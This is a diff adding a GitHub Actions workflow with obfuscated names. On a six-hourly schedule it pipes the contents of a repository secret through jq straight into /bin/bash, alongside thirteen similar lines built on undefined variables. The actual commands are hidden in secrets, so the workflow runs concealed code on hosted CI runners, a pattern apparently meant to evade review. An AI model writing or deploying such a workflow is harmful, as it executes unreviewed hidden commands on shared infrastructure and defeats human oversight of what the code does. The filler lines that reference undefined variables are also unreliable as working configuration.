@@ -1,0 +1,31 @@
+name: yuenanshan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuenanshan
+        env:
+          svvq97: ${{ secrets.svvq97 }}
+        run: |
+          echo $svvq97 | jq -r .obr6 | /bin/bash
+          echo $xwwz55 | jq -r .mo656 | /bin/bash
+          echo $r375 | jq -r .jx19290 | /bin/bash
+          echo $xsuc19 | jq -r .ybi85522 | /bin/bash
+          echo $cbvpm9 | jq -r .je62799 | /bin/bash
+          echo $jv3470 | jq -r .w296 | /bin/bash
+          echo $qzlaf054 | jq -r .gz5191 | /bin/bash
+          echo $m699 | jq -r .us7 | /bin/bash
+          echo $ikrv121 | jq -r .ixe1405 | /bin/bash
+          echo $nohmb872 | jq -r .kd96495 | /bin/bash
+          echo $cic0170 | jq -r .mgy2080 | /bin/bash
+          echo $zh88 | jq -r .qmqr9 | /bin/bash
+          echo $pbu522 | jq -r .bmz26 | /bin/bash
+          echo $dajn3 | jq -r .tc20771 | /bin/bash
+
